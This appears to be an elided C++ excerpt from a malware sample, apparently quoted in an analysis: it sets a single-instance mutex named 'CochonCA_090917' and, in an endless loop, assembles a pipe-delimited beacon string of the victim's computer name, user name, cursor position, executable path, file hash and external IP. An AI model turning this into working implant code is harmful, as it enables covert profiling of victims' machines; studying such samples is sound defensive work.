...
int main()
{
	...
	std::string foryou = "Welcome SPVM TECH !";

	CreateMutexA(NULL, TRUE, "CochonCA_090917");
	...
	while(1)
	{
		...
		std::string all_info = getenv("COMPUTERNAME") + std::string("|") + getenv("USERNAME") + std::string("|") + cursor_xy + std::string("|") + str_current_path_exe + std::string("|") + self_hash + std::string("|") + get_IP_WAN_1() + std::string("|") + web_hash + std::string("|") + test_Boiteux() + std::string("|") + long_to_string(numb_counters);
